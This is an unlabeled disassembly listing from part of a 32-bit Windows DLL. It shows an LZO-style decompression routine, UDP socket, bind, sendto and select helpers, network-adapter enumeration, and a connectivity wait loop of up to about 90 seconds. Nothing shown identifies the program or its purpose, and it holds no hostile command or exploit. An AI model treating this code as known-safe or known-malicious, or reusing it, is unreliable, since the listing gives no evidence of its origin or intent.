1000a4dd:	72 1d                	jb     0x1000a4fc
1000a4df:	8b 39                	mov    (%ecx),%edi
1000a4e1:	89 3a                	mov    %edi,(%edx)
1000a4e3:	2b f0                	sub    %eax,%esi
1000a4e5:	03 d0                	add    %eax,%edx
1000a4e7:	03 c8                	add    %eax,%ecx
1000a4e9:	3b f0                	cmp    %eax,%esi
1000a4eb:	73 f2                	jae    0x1000a4df
1000a4ed:	85 f6                	test   %esi,%esi
1000a4ef:	74 14                	je     0x1000a505
1000a4f1:	8a 01                	mov    (%ecx),%al
1000a4f3:	88 02                	mov    %al,(%edx)
1000a4f5:	42                   	inc    %edx
1000a4f6:	41                   	inc    %ecx
1000a4f7:	4e                   	dec    %esi
1000a4f8:	75 f7                	jne    0x1000a4f1
1000a4fa:	eb 09                	jmp    0x1000a505
1000a4fc:	8a 01                	mov    (%ecx),%al
1000a4fe:	88 02                	mov    %al,(%edx)
1000a500:	42                   	inc    %edx
1000a501:	41                   	inc    %ecx
1000a502:	4e                   	dec    %esi
1000a503:	75 f7                	jne    0x1000a4fc
1000a505:	0f b6 31             	movzbl (%ecx),%esi
1000a508:	41                   	inc    %ecx
1000a509:	83 fe 10             	cmp    $0x10,%esi
1000a50c:	0f 83 96 00 00 00    	jae    0x1000a5a8
1000a512:	0f b6 01             	movzbl (%ecx),%eax
1000a515:	c1 e0 02             	shl    $0x2,%eax
1000a518:	8b fa                	mov    %edx,%edi
1000a51a:	2b f8                	sub    %eax,%edi
1000a51c:	c1 ee 02             	shr    $0x2,%esi
1000a51f:	2b fe                	sub    %esi,%edi
1000a521:	81 ef 01 08 00 00    	sub    $0x801,%edi
1000a527:	41                   	inc    %ecx
1000a528:	3b 7d 0c             	cmp    0xc(%ebp),%edi
1000a52b:	0f 82 6d 02 00 00    	jb     0x1000a79e
1000a531:	3b fa                	cmp    %edx,%edi
1000a533:	0f 83 65 02 00 00    	jae    0x1000a79e
1000a539:	8b 45 08             	mov    0x8(%ebp),%eax
1000a53c:	2b c2                	sub    %edx,%eax
1000a53e:	83 f8 03             	cmp    $0x3,%eax
1000a541:	0f 82 53 02 00 00    	jb     0x1000a79a
1000a547:	8a 07                	mov    (%edi),%al
1000a549:	88 02                	mov    %al,(%edx)
1000a54b:	8a 47 01             	mov    0x1(%edi),%al
1000a54e:	88 42 01             	mov    %al,0x1(%edx)
1000a551:	8a 47 02             	mov    0x2(%edi),%al
1000a554:	88 42 02             	mov    %al,0x2(%edx)
1000a557:	83 c2 03             	add    $0x3,%edx
1000a55a:	eb 03                	jmp    0x1000a55f
1000a55c:	8b 5d fc             	mov    -0x4(%ebp),%ebx
1000a55f:	0f b6 71 fe          	movzbl -0x2(%ecx),%esi
1000a563:	83 e6 03             	and    $0x3,%esi
1000a566:	0f 84 f5 fe ff ff    	je     0x1000a461
1000a56c:	8b 45 08             	mov    0x8(%ebp),%eax
1000a56f:	2b c2                	sub    %edx,%eax
1000a571:	3b c6                	cmp    %esi,%eax
1000a573:	0f 82 21 02 00 00    	jb     0x1000a79a
1000a579:	8b c3                	mov    %ebx,%eax
1000a57b:	2b c1                	sub    %ecx,%eax
1000a57d:	8d 7e 03             	lea    0x3(%esi),%edi
1000a580:	3b c7                	cmp    %edi,%eax
1000a582:	0f 82 e4 01 00 00    	jb     0x1000a76c
1000a588:	8a 01                	mov    (%ecx),%al
1000a58a:	88 02                	mov    %al,(%edx)
1000a58c:	42                   	inc    %edx
1000a58d:	41                   	inc    %ecx
1000a58e:	83 fe 01             	cmp    $0x1,%esi
1000a591:	76 11                	jbe    0x1000a5a4
1000a593:	8a 01                	mov    (%ecx),%al
1000a595:	88 02                	mov    %al,(%edx)
1000a597:	42                   	inc    %edx
1000a598:	41                   	inc    %ecx
1000a599:	83 fe 02             	cmp    $0x2,%esi
1000a59c:	76 06                	jbe    0x1000a5a4
1000a59e:	8a 01                	mov    (%ecx),%al
1000a5a0:	88 02                	mov    %al,(%edx)
1000a5a2:	42                   	inc    %edx
1000a5a3:	41                   	inc    %ecx
1000a5a4:	0f b6 31             	movzbl (%ecx),%esi
1000a5a7:	41                   	inc    %ecx
1000a5a8:	83 fe 40             	cmp    $0x40,%esi
1000a5ab:	72 59                	jb     0x1000a606
1000a5ad:	8b c6                	mov    %esi,%eax
1000a5af:	c1 e8 02             	shr    $0x2,%eax
1000a5b2:	83 e0 07             	and    $0x7,%eax
1000a5b5:	8b fa                	mov    %edx,%edi
1000a5b7:	2b f8                	sub    %eax,%edi
1000a5b9:	0f b6 01             	movzbl (%ecx),%eax
1000a5bc:	c1 e0 03             	shl    $0x3,%eax
1000a5bf:	2b f8                	sub    %eax,%edi
1000a5c1:	4f                   	dec    %edi
1000a5c2:	c1 ee 05             	shr    $0x5,%esi
1000a5c5:	41                   	inc    %ecx
1000a5c6:	4e                   	dec    %esi
1000a5c7:	3b 7d 0c             	cmp    0xc(%ebp),%edi
1000a5ca:	0f 82 ce 01 00 00    	jb     0x1000a79e
1000a5d0:	3b fa                	cmp    %edx,%edi
1000a5d2:	0f 83 c6 01 00 00    	jae    0x1000a79e
1000a5d8:	8b 45 08             	mov    0x8(%ebp),%eax
1000a5db:	2b c2                	sub    %edx,%eax
1000a5dd:	8d 5e 02             	lea    0x2(%esi),%ebx
1000a5e0:	3b c3                	cmp    %ebx,%eax
1000a5e2:	0f 82 b2 01 00 00    	jb     0x1000a79a
1000a5e8:	8a 07                	mov    (%edi),%al
1000a5ea:	88 02                	mov    %al,(%edx)
1000a5ec:	8a 47 01             	mov    0x1(%edi),%al
1000a5ef:	88 42 01             	mov    %al,0x1(%edx)
1000a5f2:	83 c2 02             	add    $0x2,%edx
1000a5f5:	83 c7 02             	add    $0x2,%edi
1000a5f8:	8a 07                	mov    (%edi),%al
1000a5fa:	88 02                	mov    %al,(%edx)
1000a5fc:	42                   	inc    %edx
1000a5fd:	47                   	inc    %edi
1000a5fe:	4e                   	dec    %esi
1000a5ff:	75 f7                	jne    0x1000a5f8
1000a601:	e9 56 ff ff ff       	jmp    0x1000a55c
1000a606:	83 fe 20             	cmp    $0x20,%esi
1000a609:	72 52                	jb     0x1000a65d
1000a60b:	83 e6 1f             	and    $0x1f,%esi
1000a60e:	75 3a                	jne    0x1000a64a
1000a610:	eb 20                	jmp    0x1000a632
1000a612:	81 c6 ff 00 00 00    	add    $0xff,%esi
1000a618:	41                   	inc    %ecx
1000a619:	81 fe 01 fe ff ff    	cmp    $0xfffffe01,%esi
1000a61f:	0f 87 75 01 00 00    	ja     0x1000a79a
1000a625:	8b c3                	mov    %ebx,%eax
1000a627:	2b c1                	sub    %ecx,%eax
1000a629:	83 f8 01             	cmp    $0x1,%eax
1000a62c:	0f 82 3a 01 00 00    	jb     0x1000a76c
1000a632:	80 39 00             	cmpb   $0x0,(%ecx)
1000a635:	74 db                	je     0x1000a612
1000a637:	0f b6 01             	movzbl (%ecx),%eax
1000a63a:	41                   	inc    %ecx
1000a63b:	2b d9                	sub    %ecx,%ebx
1000a63d:	8d 74 06 1f          	lea    0x1f(%esi,%eax,1),%esi
1000a641:	83 fb 02             	cmp    $0x2,%ebx
1000a644:	0f 82 22 01 00 00    	jb     0x1000a76c
1000a64a:	66 8b 01             	mov    (%ecx),%ax
1000a64d:	0f b7 c0             	movzwl %ax,%eax
1000a650:	c1 e8 02             	shr    $0x2,%eax
1000a653:	8d 7a ff             	lea    -0x1(%edx),%edi
1000a656:	2b f8                	sub    %eax,%edi
1000a658:	83 c1 02             	add    $0x2,%ecx
1000a65b:	eb 72                	jmp    0x1000a6cf
1000a65d:	8b fa                	mov    %edx,%edi
1000a65f:	83 fe 10             	cmp    $0x10,%esi
1000a662:	0f 82 d0 00 00 00    	jb     0x1000a738
1000a668:	8b c6                	mov    %esi,%eax
1000a66a:	83 e0 08             	and    $0x8,%eax
1000a66d:	c1 e0 0b             	shl    $0xb,%eax
1000a670:	2b f8                	sub    %eax,%edi
1000a672:	83 e6 07             	and    $0x7,%esi
1000a675:	75 3c                	jne    0x1000a6b3
1000a677:	eb 20                	jmp    0x1000a699
1000a679:	81 c6 ff 00 00 00    	add    $0xff,%esi
1000a67f:	41                   	inc    %ecx
1000a680:	81 fe 01 fe ff ff    	cmp    $0xfffffe01,%esi
1000a686:	0f 87 0e 01 00 00    	ja     0x1000a79a
1000a68c:	8b c3                	mov    %ebx,%eax
1000a68e:	2b c1                	sub    %ecx,%eax
1000a690:	83 f8 01             	cmp    $0x1,%eax
1000a693:	0f 82 d3 00 00 00    	jb     0x1000a76c
1000a699:	80 39 00             	cmpb   $0x0,(%ecx)
1000a69c:	74 db                	je     0x1000a679
1000a69e:	0f b6 01             	movzbl (%ecx),%eax
1000a6a1:	8d 74 06 07          	lea    0x7(%esi,%eax,1),%esi
1000a6a5:	41                   	inc    %ecx
1000a6a6:	8b c3                	mov    %ebx,%eax
1000a6a8:	2b c1                	sub    %ecx,%eax
1000a6aa:	83 f8 02             	cmp    $0x2,%eax
1000a6ad:	0f 82 b9 00 00 00    	jb     0x1000a76c
1000a6b3:	66 8b 01             	mov    (%ecx),%ax
1000a6b6:	0f b7 c0             	movzwl %ax,%eax
1000a6b9:	c1 e8 02             	shr    $0x2,%eax
1000a6bc:	2b f8                	sub    %eax,%edi
1000a6be:	83 c1 02             	add    $0x2,%ecx
1000a6c1:	3b fa                	cmp    %edx,%edi
1000a6c3:	0f 84 b3 00 00 00    	je     0x1000a77c
1000a6c9:	81 ef 00 40 00 00    	sub    $0x4000,%edi
1000a6cf:	3b 7d 0c             	cmp    0xc(%ebp),%edi
1000a6d2:	0f 82 c6 00 00 00    	jb     0x1000a79e
1000a6d8:	3b fa                	cmp    %edx,%edi
1000a6da:	0f 83 be 00 00 00    	jae    0x1000a79e
1000a6e0:	8b 45 08             	mov    0x8(%ebp),%eax
1000a6e3:	2b c2                	sub    %edx,%eax
1000a6e5:	8d 5e 02             	lea    0x2(%esi),%ebx
1000a6e8:	3b c3                	cmp    %ebx,%eax
1000a6ea:	0f 82 aa 00 00 00    	jb     0x1000a79a
1000a6f0:	83 fe 06             	cmp    $0x6,%esi
1000a6f3:	0f 82 ef fe ff ff    	jb     0x1000a5e8
1000a6f9:	8b c2                	mov    %edx,%eax
1000a6fb:	2b c7                	sub    %edi,%eax
1000a6fd:	83 f8 04             	cmp    $0x4,%eax
1000a700:	0f 8c e2 fe ff ff    	jl     0x1000a5e8
1000a706:	8b 07                	mov    (%edi),%eax
1000a708:	89 02                	mov    %eax,(%edx)
1000a70a:	6a 04                	push   $0x4
1000a70c:	58                   	pop    %eax
1000a70d:	03 d0                	add    %eax,%edx
1000a70f:	03 f8                	add    %eax,%edi
1000a711:	83 ee 02             	sub    $0x2,%esi
1000a714:	8b 1f                	mov    (%edi),%ebx
1000a716:	89 1a                	mov    %ebx,(%edx)
1000a718:	2b f0                	sub    %eax,%esi
1000a71a:	03 d0                	add    %eax,%edx
1000a71c:	03 f8                	add    %eax,%edi
1000a71e:	3b f0                	cmp    %eax,%esi
1000a720:	73 f2                	jae    0x1000a714
1000a722:	85 f6                	test   %esi,%esi
1000a724:	0f 84 32 fe ff ff    	je     0x1000a55c
1000a72a:	8a 07                	mov    (%edi),%al
1000a72c:	88 02                	mov    %al,(%edx)
1000a72e:	42                   	inc    %edx
1000a72f:	47                   	inc    %edi
1000a730:	4e                   	dec    %esi
1000a731:	75 f7                	jne    0x1000a72a
1000a733:	e9 24 fe ff ff       	jmp    0x1000a55c
1000a738:	0f b6 01             	movzbl (%ecx),%eax
1000a73b:	c1 e0 02             	shl    $0x2,%eax
1000a73e:	2b f8                	sub    %eax,%edi
1000a740:	c1 ee 02             	shr    $0x2,%esi
1000a743:	2b fe                	sub    %esi,%edi
1000a745:	4f                   	dec    %edi
1000a746:	41                   	inc    %ecx
1000a747:	3b 7d 0c             	cmp    0xc(%ebp),%edi
1000a74a:	72 52                	jb     0x1000a79e
1000a74c:	3b fa                	cmp    %edx,%edi
1000a74e:	73 4e                	jae    0x1000a79e
1000a750:	8b 45 08             	mov    0x8(%ebp),%eax
1000a753:	2b c2                	sub    %edx,%eax
1000a755:	83 f8 02             	cmp    $0x2,%eax
1000a758:	72 40                	jb     0x1000a79a
1000a75a:	8a 07                	mov    (%edi),%al
1000a75c:	88 02                	mov    %al,(%edx)
1000a75e:	8a 47 01             	mov    0x1(%edi),%al
1000a761:	88 42 01             	mov    %al,0x1(%edx)
1000a764:	83 c2 02             	add    $0x2,%edx
1000a767:	e9 f3 fd ff ff       	jmp    0x1000a55f
1000a76c:	6a fc                	push   $0xfffffffc
1000a76e:	2b 55 0c             	sub    0xc(%ebp),%edx
1000a771:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000a774:	58                   	pop    %eax
1000a775:	89 11                	mov    %edx,(%ecx)
1000a777:	5f                   	pop    %edi
1000a778:	5e                   	pop    %esi
1000a779:	5b                   	pop    %ebx
1000a77a:	c9                   	leave  
1000a77b:	c3                   	ret    
1000a77c:	2b 55 0c             	sub    0xc(%ebp),%edx
1000a77f:	8b 45 10             	mov    0x10(%ebp),%eax
1000a782:	89 10                	mov    %edx,(%eax)
1000a784:	8b c1                	mov    %ecx,%eax
1000a786:	2b c3                	sub    %ebx,%eax
1000a788:	3b cb                	cmp    %ebx,%ecx
1000a78a:	1b c9                	sbb    %ecx,%ecx
1000a78c:	83 e1 fc             	and    $0xfffffffc,%ecx
1000a78f:	83 c1 fc             	add    $0xfffffffc,%ecx
1000a792:	f7 d8                	neg    %eax
1000a794:	1b c0                	sbb    %eax,%eax
1000a796:	23 c1                	and    %ecx,%eax
1000a798:	eb dd                	jmp    0x1000a777
1000a79a:	6a fb                	push   $0xfffffffb
1000a79c:	eb d0                	jmp    0x1000a76e
1000a79e:	6a fa                	push   $0xfffffffa
1000a7a0:	eb cc                	jmp    0x1000a76e
1000a7a2:	55                   	push   %ebp
1000a7a3:	8b ec                	mov    %esp,%ebp
1000a7a5:	51                   	push   %ecx
1000a7a6:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000a7aa:	6a 00                	push   $0x0
1000a7ac:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000a7af:	50                   	push   %eax
1000a7b0:	ff 15 10 e2 00 10    	call   *0x1000e210
1000a7b6:	85 c0                	test   %eax,%eax
1000a7b8:	75 02                	jne    0x1000a7bc
1000a7ba:	c9                   	leave  
1000a7bb:	c3                   	ret    
1000a7bc:	33 c0                	xor    %eax,%eax
1000a7be:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
1000a7c2:	0f 95 c0             	setne  %al
1000a7c5:	c9                   	leave  
1000a7c6:	c3                   	ret    
1000a7c7:	51                   	push   %ecx
1000a7c8:	e8 70 02 00 00       	call   0x1000aa3d
1000a7cd:	85 c0                	test   %eax,%eax
1000a7cf:	74 05                	je     0x1000a7d6
1000a7d1:	33 c0                	xor    %eax,%eax
1000a7d3:	40                   	inc    %eax
1000a7d4:	59                   	pop    %ecx
1000a7d5:	c3                   	ret    
1000a7d6:	e8 c7 ff ff ff       	call   0x1000a7a2
1000a7db:	59                   	pop    %ecx
1000a7dc:	c3                   	ret    
1000a7dd:	55                   	push   %ebp
1000a7de:	8b ec                	mov    %esp,%ebp
1000a7e0:	83 e4 f8             	and    $0xfffffff8,%esp
1000a7e3:	56                   	push   %esi
1000a7e4:	8b 35 40 e1 00 10    	mov    0x1000e140,%esi
1000a7ea:	57                   	push   %edi
1000a7eb:	ff d6                	call   *%esi
1000a7ed:	8b f8                	mov    %eax,%edi
1000a7ef:	eb 09                	jmp    0x1000a7fa
1000a7f1:	e8 d1 ff ff ff       	call   0x1000a7c7
1000a7f6:	85 c0                	test   %eax,%eax
1000a7f8:	75 11                	jne    0x1000a80b
1000a7fa:	ff d6                	call   *%esi
1000a7fc:	2b c7                	sub    %edi,%eax
1000a7fe:	3b 45 08             	cmp    0x8(%ebp),%eax
1000a801:	72 ee                	jb     0x1000a7f1
1000a803:	33 c0                	xor    %eax,%eax
1000a805:	5f                   	pop    %edi
1000a806:	5e                   	pop    %esi
1000a807:	8b e5                	mov    %ebp,%esp
1000a809:	5d                   	pop    %ebp
1000a80a:	c3                   	ret    
1000a80b:	33 c0                	xor    %eax,%eax
1000a80d:	40                   	inc    %eax
1000a80e:	eb f5                	jmp    0x1000a805
1000a810:	68 90 5f 01 00       	push   $0x15f90
1000a815:	e8 c3 ff ff ff       	call   0x1000a7dd
1000a81a:	59                   	pop    %ecx
1000a81b:	c3                   	ret    
1000a81c:	55                   	push   %ebp
1000a81d:	8b ec                	mov    %esp,%ebp
1000a81f:	83 ec 14             	sub    $0x14,%esp
1000a822:	56                   	push   %esi
1000a823:	57                   	push   %edi
1000a824:	33 ff                	xor    %edi,%edi
1000a826:	57                   	push   %edi
1000a827:	6a 02                	push   $0x2
1000a829:	6a 02                	push   $0x2
1000a82b:	ff 15 48 e2 00 10    	call   *0x1000e248
1000a831:	8b f0                	mov    %eax,%esi
1000a833:	83 fe ff             	cmp    $0xffffffff,%esi
1000a836:	74 4e                	je     0x1000a886
1000a838:	6a 10                	push   $0x10
1000a83a:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000a83d:	57                   	push   %edi
1000a83e:	50                   	push   %eax
1000a83f:	e8 e6 34 00 00       	call   0x1000dd2a
1000a844:	83 c4 0c             	add    $0xc,%esp
1000a847:	6a 02                	push   $0x2
1000a849:	58                   	pop    %eax
1000a84a:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000a84e:	66 8b 45 08          	mov    0x8(%ebp),%ax
1000a852:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
1000a856:	6a 10                	push   $0x10
1000a858:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000a85b:	50                   	push   %eax
1000a85c:	56                   	push   %esi
1000a85d:	89 7d f0             	mov    %edi,-0x10(%ebp)
1000a860:	ff 15 34 e2 00 10    	call   *0x1000e234
1000a866:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a869:	75 1b                	jne    0x1000a886
1000a86b:	ff 15 64 e2 00 10    	call   *0x1000e264
1000a871:	56                   	push   %esi
1000a872:	8b f8                	mov    %eax,%edi
1000a874:	ff 15 84 e2 00 10    	call   *0x1000e284
1000a87a:	57                   	push   %edi
1000a87b:	ff 15 38 e2 00 10    	call   *0x1000e238
1000a881:	83 c8 ff             	or     $0xffffffff,%eax
1000a884:	eb 02                	jmp    0x1000a888
1000a886:	8b c6                	mov    %esi,%eax
1000a888:	5f                   	pop    %edi
1000a889:	5e                   	pop    %esi
1000a88a:	c9                   	leave  
1000a88b:	c3                   	ret    
1000a88c:	55                   	push   %ebp
1000a88d:	8b ec                	mov    %esp,%ebp
1000a88f:	6a 10                	push   $0x10
1000a891:	ff 75 14             	pushl  0x14(%ebp)
1000a894:	6a 00                	push   $0x0
1000a896:	ff 75 10             	pushl  0x10(%ebp)
1000a899:	ff 75 0c             	pushl  0xc(%ebp)
1000a89c:	ff 75 08             	pushl  0x8(%ebp)
1000a89f:	ff 15 30 e2 00 10    	call   *0x1000e230
1000a8a5:	33 c9                	xor    %ecx,%ecx
1000a8a7:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a8aa:	0f 95 c1             	setne  %cl
1000a8ad:	8b c1                	mov    %ecx,%eax
1000a8af:	5d                   	pop    %ebp
1000a8b0:	c3                   	ret    
1000a8b1:	55                   	push   %ebp
1000a8b2:	8b ec                	mov    %esp,%ebp
1000a8b4:	83 ec 14             	sub    $0x14,%esp
1000a8b7:	6a 10                	push   $0x10
1000a8b9:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000a8bc:	6a 00                	push   $0x0
1000a8be:	50                   	push   %eax
1000a8bf:	e8 66 34 00 00       	call   0x1000dd2a
1000a8c4:	6a 02                	push   $0x2
1000a8c6:	58                   	pop    %eax
1000a8c7:	66 89 45 ec          	mov    %ax,-0x14(%ebp)
1000a8cb:	8b 45 14             	mov    0x14(%ebp),%eax
1000a8ce:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000a8d1:	66 8b 45 18          	mov    0x18(%ebp),%ax
1000a8d5:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
1000a8d9:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000a8dc:	50                   	push   %eax
1000a8dd:	ff 75 10             	pushl  0x10(%ebp)
1000a8e0:	ff 75 0c             	pushl  0xc(%ebp)
1000a8e3:	ff 75 08             	pushl  0x8(%ebp)
1000a8e6:	e8 a1 ff ff ff       	call   0x1000a88c
1000a8eb:	33 c9                	xor    %ecx,%ecx
1000a8ed:	83 c4 1c             	add    $0x1c,%esp
1000a8f0:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a8f3:	0f 95 c1             	setne  %cl
1000a8f6:	8b c1                	mov    %ecx,%eax
1000a8f8:	c9                   	leave  
1000a8f9:	c3                   	ret    
1000a8fa:	55                   	push   %ebp
1000a8fb:	8b ec                	mov    %esp,%ebp
1000a8fd:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
1000a903:	33 d2                	xor    %edx,%edx
1000a905:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
1000a90a:	f7 f1                	div    %ecx
1000a90c:	53                   	push   %ebx
1000a90d:	33 db                	xor    %ebx,%ebx
1000a90f:	89 b5 f8 fe ff ff    	mov    %esi,-0x108(%ebp)
1000a915:	c7 85 f4 fe ff ff 01 	movl   $0x1,-0x10c(%ebp)
1000a91c:	00 00 00 
1000a91f:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000a922:	8b c2                	mov    %edx,%eax
1000a924:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000a927:	3b c3                	cmp    %ebx,%eax
1000a929:	74 09                	je     0x1000a934
1000a92b:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
1000a931:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000a934:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000a937:	50                   	push   %eax
1000a938:	53                   	push   %ebx
1000a939:	53                   	push   %ebx
1000a93a:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
1000a940:	50                   	push   %eax
1000a941:	53                   	push   %ebx
1000a942:	ff 15 80 e2 00 10    	call   *0x1000e280
1000a948:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a94b:	75 08                	jne    0x1000a955
1000a94d:	ff 15 64 e2 00 10    	call   *0x1000e264
1000a953:	eb 2c                	jmp    0x1000a981
1000a955:	3b c3                	cmp    %ebx,%eax
1000a957:	74 23                	je     0x1000a97c
1000a959:	ff 75 14             	pushl  0x14(%ebp)
1000a95c:	ff 75 10             	pushl  0x10(%ebp)
1000a95f:	53                   	push   %ebx
1000a960:	ff 75 0c             	pushl  0xc(%ebp)
1000a963:	ff 75 08             	pushl  0x8(%ebp)
1000a966:	56                   	push   %esi
1000a967:	ff 15 2c e2 00 10    	call   *0x1000e22c
1000a96d:	89 07                	mov    %eax,(%edi)
1000a96f:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a972:	75 04                	jne    0x1000a978
1000a974:	89 1f                	mov    %ebx,(%edi)
1000a976:	eb d5                	jmp    0x1000a94d
1000a978:	33 c0                	xor    %eax,%eax
1000a97a:	eb 05                	jmp    0x1000a981
1000a97c:	b8 02 01 00 00       	mov    $0x102,%eax
1000a981:	5b                   	pop    %ebx
1000a982:	c9                   	leave  
1000a983:	c3                   	ret    
1000a984:	55                   	push   %ebp
1000a985:	8b ec                	mov    %esp,%ebp
1000a987:	83 ec 24             	sub    $0x24,%esp
1000a98a:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000a98d:	50                   	push   %eax
1000a98e:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000a991:	50                   	push   %eax
1000a992:	6a 04                	push   $0x4
1000a994:	ff 75 08             	pushl  0x8(%ebp)
1000a997:	c7 45 fc 20 00 00 00 	movl   $0x20,-0x4(%ebp)
1000a99e:	6a 64                	push   $0x64
1000a9a0:	58                   	pop    %eax
1000a9a1:	e8 54 ff ff ff       	call   0x1000a8fa
1000a9a6:	83 c4 10             	add    $0x10,%esp
1000a9a9:	c9                   	leave  
1000a9aa:	c3                   	ret    
1000a9ab:	55                   	push   %ebp
1000a9ac:	8b ec                	mov    %esp,%ebp
1000a9ae:	83 ec 10             	sub    $0x10,%esp
1000a9b1:	53                   	push   %ebx
1000a9b2:	56                   	push   %esi
1000a9b3:	8b 35 58 e0 00 10    	mov    0x1000e058,%esi
1000a9b9:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000a9bc:	50                   	push   %eax
1000a9bd:	33 db                	xor    %ebx,%ebx
1000a9bf:	53                   	push   %ebx
1000a9c0:	53                   	push   %ebx
1000a9c1:	6a 10                	push   $0x10
1000a9c3:	6a 02                	push   $0x2
1000a9c5:	ff d6                	call   *%esi
1000a9c7:	83 f8 6f             	cmp    $0x6f,%eax
1000a9ca:	75 29                	jne    0x1000a9f5
1000a9cc:	ff 75 fc             	pushl  -0x4(%ebp)
1000a9cf:	e8 10 c0 ff ff       	call   0x100069e4
1000a9d4:	59                   	pop    %ecx
1000a9d5:	8d 4d fc             	lea    -0x4(%ebp),%ecx
1000a9d8:	51                   	push   %ecx
1000a9d9:	50                   	push   %eax
1000a9da:	53                   	push   %ebx
1000a9db:	6a 10                	push   $0x10
1000a9dd:	6a 02                	push   $0x2
1000a9df:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000a9e2:	ff d6                	call   *%esi
1000a9e4:	3b c3                	cmp    %ebx,%eax
1000a9e6:	74 11                	je     0x1000a9f9
1000a9e8:	8b d8                	mov    %eax,%ebx
1000a9ea:	ff 75 f8             	pushl  -0x8(%ebp)
1000a9ed:	e8 21 c0 ff ff       	call   0x10006a13
1000a9f2:	59                   	pop    %ecx
1000a9f3:	8b c3                	mov    %ebx,%eax
1000a9f5:	5e                   	pop    %esi
1000a9f6:	5b                   	pop    %ebx
1000a9f7:	c9                   	leave  
1000a9f8:	c3                   	ret    
1000a9f9:	8b 07                	mov    (%edi),%eax
1000a9fb:	8b 4d f8             	mov    -0x8(%ebp),%ecx
1000a9fe:	89 45 f0             	mov    %eax,-0x10(%ebp)
1000aa01:	89 1f                	mov    %ebx,(%edi)
1000aa03:	eb 2a                	jmp    0x1000aa2f
1000aa05:	8b 41 10             	mov    0x10(%ecx),%eax
1000aa08:	3b c3                	cmp    %ebx,%eax
1000aa0a:	74 20                	je     0x1000aa2c
1000aa0c:	8b 0f                	mov    (%edi),%ecx
1000aa0e:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
1000aa11:	74 25                	je     0x1000aa38
1000aa13:	8b 50 0c             	mov    0xc(%eax),%edx
1000aa16:	8b 52 04             	mov    0x4(%edx),%edx
1000aa19:	8b 75 08             	mov    0x8(%ebp),%esi
1000aa1c:	8b 40 08             	mov    0x8(%eax),%eax
1000aa1f:	89 14 8e             	mov    %edx,(%esi,%ecx,4)
1000aa22:	41                   	inc    %ecx
1000aa23:	89 0f                	mov    %ecx,(%edi)
1000aa25:	3b c3                	cmp    %ebx,%eax
1000aa27:	75 e3                	jne    0x1000aa0c
1000aa29:	8b 4d f4             	mov    -0xc(%ebp),%ecx
1000aa2c:	8b 49 08             	mov    0x8(%ecx),%ecx
1000aa2f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
1000aa32:	3b cb                	cmp    %ebx,%ecx
1000aa34:	75 cf                	jne    0x1000aa05
1000aa36:	eb b2                	jmp    0x1000a9ea
1000aa38:	6a 7a                	push   $0x7a
1000aa3a:	5b                   	pop    %ebx
1000aa3b:	eb ad                	jmp    0x1000a9ea
1000aa3d:	55                   	push   %ebp
1000aa3e:	8b ec                	mov    %esp,%ebp
1000aa40:	83 ec 2c             	sub    $0x2c,%esp
1000aa43:	53                   	push   %ebx
1000aa44:	56                   	push   %esi
1000aa45:	57                   	push   %edi
1000aa46:	8d 75 d8             	lea    -0x28(%ebp),%esi
1000aa49:	e8 78 f8 ff ff       	call   0x1000a2c6
1000aa4e:	8b ce                	mov    %esi,%ecx
1000aa50:	e8 5a f9 ff ff       	call   0x1000a3af
1000aa55:	84 c0                	test   %al,%al
1000aa57:	75 0d                	jne    0x1000aa66
1000aa59:	e8 ac f8 ff ff       	call   0x1000a30a
1000aa5e:	33 c0                	xor    %eax,%eax
1000aa60:	40                   	inc    %eax
1000aa61:	5f                   	pop    %edi
1000aa62:	5e                   	pop    %esi
1000aa63:	5b                   	pop    %ebx
1000aa64:	c9                   	leave  
1000aa65:	c3                   	ret    
1000aa66:	68 dc ec 00 10       	push   $0x1000ecdc
1000aa6b:	e8 b4 f8 ff ff       	call   0x1000a324
1000aa70:	68 f4 ec 00 10       	push   $0x1000ecf4
1000aa75:	8d 4d d8             	lea    -0x28(%ebp),%ecx
1000aa78:	e8 a7 f8 ff ff       	call   0x1000a324
1000aa7d:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000aa80:	33 db                	xor    %ebx,%ebx
1000aa82:	e8 17 f9 ff ff       	call   0x1000a39e
1000aa87:	85 c0                	test   %eax,%eax
1000aa89:	74 77                	je     0x1000ab02
1000aa8b:	53                   	push   %ebx
1000aa8c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
1000aa8f:	e8 d7 f8 ff ff       	call   0x1000a36b
1000aa94:	ff 30                	pushl  (%eax)
1000aa96:	e8 ed ae ff ff       	call   0x10005988
1000aa9b:	8b f0                	mov    %eax,%esi
1000aa9d:	59                   	pop    %ecx
1000aa9e:	85 f6                	test   %esi,%esi
1000aaa0:	74 53                	je     0x1000aaf5
1000aaa2:	83 fe ff             	cmp    $0xffffffff,%esi
1000aaa5:	74 4e                	je     0x1000aaf5
1000aaa7:	6a 00                	push   $0x0
1000aaa9:	6a 01                	push   $0x1
1000aaab:	6a 02                	push   $0x2
